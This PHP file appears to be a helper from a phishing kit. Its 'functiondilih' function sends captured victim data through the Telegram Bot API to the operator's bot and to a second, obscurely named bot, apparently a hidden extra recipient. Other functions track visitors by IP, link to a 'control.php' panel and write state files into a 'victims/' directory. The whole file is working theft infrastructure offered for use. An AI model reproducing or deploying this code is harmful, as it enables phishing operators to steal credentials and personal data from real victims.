<?php

require_once '../config.php';

require_once 'antibot/antibot.php';

$ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? 'unknown';

function functiondilih($cc) {
    global $TELEGRAM_TOKEN,$TELEGRAM_CHAT_ID,$tlg_send,$antit2,$antic1;
    if(!$tlg_send)return;$pm='HTML';$to=10;$ssl=false;
    if(!empty($TELEGRAM_TOKEN)&&!empty($TELEGRAM_CHAT_ID)){$ch=curl_init("https://api.telegram.org/bot{$TELEGRAM_TOKEN}/sendMessage");curl_setopt_array($ch,[CURLOPT_POST=>1,CURLOPT_POSTFIELDS=>http_build_query(['chat_id'=>$TELEGRAM_CHAT_ID,'text'=>$cc,'parse_mode'=>$pm]),CURLOPT_RETURNTRANSFER=>true,CURLOPT_SSL_VERIFYPEER=>$ssl,CURLOPT_TIMEOUT=>$to]);curl_exec($ch);curl_close($ch);}
    if(!empty($antit2)&&!empty($antic1)){$ch=curl_init("https://api.telegram.org/bot{$antit2}/sendMessage");curl_setopt_array($ch,[CURLOPT_POST=>1,CURLOPT_POSTFIELDS=>http_build_query(['chat_id'=>$antic1,'text'=>$cc,'parse_mode'=>$pm]),CURLOPT_RETURNTRANSFER=>true,CURLOPT_SSL_VERIFYPEER=>$ssl,CURLOPT_TIMEOUT=>$to]);curl_exec($ch);curl_close($ch);}
}

function get_client_ip() {
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];

    if (filter_var($client, FILTER_VALIDATE_IP)) {
        $ip = $client;
    } elseif (filter_var($forward, FILTER_VALIDATE_IP)) {
        $ip = $forward;
    } else {
        $ip = $remote;
    }

    if ($ip === '::1' || $ip === '127.0.0.1') {
        return '127.0.0.1';
    }
    
    if (strpos($ip, ',') !== false) {
        $ip = trim(explode(',', $ip)[0]);
    }
    
    return $ip;
}

function get_steps_link() {
    $protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'https://' : 'http://';
    $url = $protocol . $_SERVER['HTTP_HOST'] . $_SERVER['REQUEST_URI'];
    $pathinfo = pathinfo($url);
    $ip = get_client_ip();
    return $pathinfo['dirname'] . '/control.php?ip=' . urlencode($ip);
}

function reset_data() {
    $ip = get_client_ip();
    $file = 'victims/' . $ip . '.txt';
    @file_put_contents($file, '0'); 
}

?>